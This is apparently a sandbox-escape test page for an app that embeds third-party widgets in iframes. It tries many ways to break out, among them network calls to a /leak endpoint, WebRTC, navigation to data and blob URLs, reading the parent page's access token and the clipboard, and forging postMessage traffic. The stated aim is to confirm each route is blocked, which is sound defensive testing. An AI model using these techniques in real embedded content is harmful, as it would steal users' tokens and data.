<div id="v">probe</div>
<style>body { padding: 10px; color: var(--red); font-size: 12px; overflow: auto; }</style>
<script>
  // A hostile thing. It tries every way out of its frame that we could think
  // of and reports what happened. "blocked" is the wanted outcome everywhere.
  // Network attempts carry a "via" name: the server records any that arrive,
  // and its record overrules what this page believes.
  const here = new URL(location.href);
  const SELF = `${here.protocol}//${here.host}`;
  const OTHER = `http://${here.hostname === "localhost" ? "127.0.0.1" : "localhost"}:${here.port}`;
  const mode = here.searchParams.get("mode") || "main";
  const out = [];
  const show = (t) => (document.getElementById("v").textContent = t);
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));

  async function attempt(name, via, fn) {
    let outcome, detail = "";
    try {
      const r = await Promise.race([fn(), wait(2500).then(() => ({ outcome: "blocked", detail: "no answer" }))]);
      outcome = r.outcome; detail = r.detail || "";
    } catch (e) {
      outcome = "blocked"; detail = String(e.name || e).slice(0, 60);
    }
    out.push({ name, via, outcome, detail });
  }
  const ok = (detail) => ({ outcome: "ALLOWED", detail });
  const no = (detail) => ({ outcome: "blocked", detail });
  const loads = (el) => new Promise((r) => { el.onload = () => r(ok("loaded")); el.onerror = () => r(no("load error")); });

  async function main() {
    await attempt("fetch to another site", "fetch", () => fetch(`${OTHER}/leak?via=fetch`, { mode: "no-cors" }).then(() => ok("answered")));
    await attempt("fetch to the canvas's own server", "fetch-self", () => fetch(`${SELF}/leak?via=fetch-self`, { mode: "no-cors" }).then(() => ok("answered")));
    await attempt("XMLHttpRequest", "xhr", () => new Promise((r) => { const x = new XMLHttpRequest(); x.open("GET", `${OTHER}/leak?via=xhr`); x.onload = () => r(ok("answered")); x.onerror = () => r(no("error")); x.send(); }));
    await attempt("WebSocket", "websocket", () => new Promise((r) => { const w = new WebSocket(`${OTHER.replace("http", "ws")}/leak-ws`); w.onopen = () => r(ok("opened")); w.onerror = () => r(no("error")); }));
    await attempt("EventSource", "sse", () => new Promise((r) => { const s = new EventSource(`${OTHER}/leak?via=sse`); s.onopen = () => r(ok("opened")); s.onerror = () => { s.close(); r(no("error")); }; }));
    await attempt("sendBeacon", "beacon", async () => (navigator.sendBeacon(`${OTHER}/leak?via=beacon`, "x") ? { outcome: "blocked", detail: "queued; the server decides" } : no("refused")));
    await attempt("image from another site", "img", () => { const i = new Image(); const p = loads(i); i.src = `${OTHER}/leak?via=img`; return p; });
    await attempt("script from another site", "script", () => { const s = document.createElement("script"); const p = loads(s); s.src = `${OTHER}/leak.js?via=script`; document.head.append(s); return p; });
    await attempt("stylesheet from another site", "css", () => { const l = document.createElement("link"); l.rel = "stylesheet"; const p = loads(l); l.href = `${OTHER}/leak.css?via=css`; document.head.append(l); return p; });
    await attempt("background image in a style", "cssbg", async () => { const d = document.createElement("div"); d.style.backgroundImage = `url(${OTHER}/leak?via=cssbg)`; d.style.height = "1px"; document.body.append(d); await wait(600); return no("the server decides"); });
    await attempt("frame inside the thing", "iframe", () => { const f = document.createElement("iframe"); const p = loads(f).then(() => no("loaded something; the server decides")); f.src = `${OTHER}/leak?via=iframe`; document.body.append(f); return p; });
    await attempt("form sent to another site", "form", async () => { const f = document.createElement("form"); f.action = `${OTHER}/leak?via=form`; f.method = "get"; f.target = "_blank"; document.body.append(f); f.submit(); await wait(600); return no("the server decides"); });
    await attempt("popup window", "popup", async () => (window.open(`${OTHER}/leak?via=popup`) ? ok("a window opened") : no("no window")));
    await attempt("WebRTC connection", "webrtc-stun", async () => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:${new URL(OTHER).hostname}:${here.port}` }] });
      let candidates = 0;
      pc.onicecandidate = (e) => { if (e.candidate) candidates++; };
      pc.createDataChannel("x");
      await pc.setLocalDescription(await pc.createOffer());
      await wait(1500);
      pc.close();
      return candidates ? ok(`${candidates} candidates gathered`) : no("no candidates");
    });
    await attempt("WebRTC through a blank inner frame", "webrtc-inner", async () => {
      // If the canvas removed the WebRTC interfaces from this page, a fresh inner page may still have them.
      const f = document.createElement("iframe");
      document.body.append(f);
      const RTC = f.contentWindow && f.contentWindow.RTCPeerConnection;
      if (!RTC) return no("no interface in the inner frame");
      const pc = new RTC({ iceServers: [{ urls: `stun:${new URL(OTHER).hostname}:${Number(here.port) + 1}` }] });
      pc.createDataChannel("x");
      await pc.setLocalDescription(await pc.createOffer());
      await wait(1500);
      pc.close();
      return no("ran; the server decides");
    });
    await attempt("background worker", "", async () => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" }))); return await new Promise((r) => { w.onmessage = () => r(ok("a worker ran")); w.onerror = () => r(no("worker refused")); }); });

    await attempt("read the frame page's document", "", async () => ok(String(parent.document.title)));
    await attempt("read the frame page's access token", "", async () => ok(String(parent.sessionStorage.getItem("woody_token") || parent.WOODY_TOKEN)));
    await attempt("read the frame page's address", "", async () => ok(String(top.location.href)));
    await attempt("read another thing's document", "", async () => ok(String(parent.frames[0].document.body.textContent).slice(0, 30)));
    await attempt("storage of its own (localStorage)", "", async () => { localStorage.setItem("a", "1"); return ok("writable"); });
    await attempt("storage of its own (cookie)", "", async () => { document.cookie = "a=1"; return document.cookie ? ok("cookie kept") : no("not kept"); });
    await attempt("storage of its own (indexedDB)", "", () => new Promise((r) => { const q = indexedDB.open("x"); q.onsuccess = () => r(ok("opened")); q.onerror = () => r(no("refused")); }));
    await attempt("blocking dialog (alert)", "", async () => { const t = performance.now(); alert("x"); return performance.now() - t < 200 ? no("ignored") : ok("a dialog was shown"); });
    await attempt("read the clipboard", "", async () => ok(String(await navigator.clipboard.readText()).slice(0, 10)));

    // Speak to the other things directly, pretending to be the frame page.
    let posted = 0;
    for (let i = 0; i < parent.frames.length; i++) {
      try { if (parent.frames[i] !== window) { parent.frames[i].postMessage({ woody: 1, feed: "meters", value: "FORGED" }, "*"); posted++; } } catch (e) {}
    }
    out.push({ name: "forge a reading for another thing", via: "", outcome: "pending", detail: `${posted} messages posted` });
    // Ask the bridge for another thing's state, and try to overwrite it.
    const mine = await woody.state.get();
    parent.postMessage({ woody: 1, id: 0, op: "state.set", thing: "victim", args: { value: { secret: "overwritten" }, thing: "victim" } }, "*");
    out.push({ name: "read another thing's saved state", via: "", outcome: JSON.stringify(mine || "").includes("victim-data") ? "ALLOWED" : "blocked", detail: "" });

    out.push({ name: "what the thing can learn (not a failure)", via: "", outcome: "ok", detail: `referrer "${document.referrer}" · ancestors ${[...(location.ancestorOrigins || [])].join(",")}` });
    show(`probe done: ${out.filter((o) => o.outcome === "ALLOWED").length} allowed of ${out.length}`);
    await woody.report({ probe: out });
  }

  (async () => {
    await woody.ready();
    if (mode === "main") return main();
    // The remaining modes replace this document, so each runs in its own frame.
    const leakPage = `<script>fetch("${OTHER}/leak?via=${mode}", { mode: "no-cors" }); new Image().src = "${OTHER}/leak?via=${mode}-img";<\/script>`;
    await wait(100);
    if (mode === "nav-other") location.href = `${OTHER}/leak?via=nav-other`;
    if (mode === "nav-self") location.href = `${SELF}/leak?via=nav-self`;
    if (mode === "nav-data") location.href = `data:text/html,${encodeURIComponent(leakPage)}`;
    if (mode === "nav-blob") location.href = URL.createObjectURL(new Blob([leakPage], { type: "text/html" }));
    if (mode === "top") {
      let outcome = "ALLOWED";
      try { top.location.href = `${OTHER}/leak?via=top`; } catch (e) { outcome = "blocked"; }
      await woody.report({ top: outcome });
    }
  })();
</script>
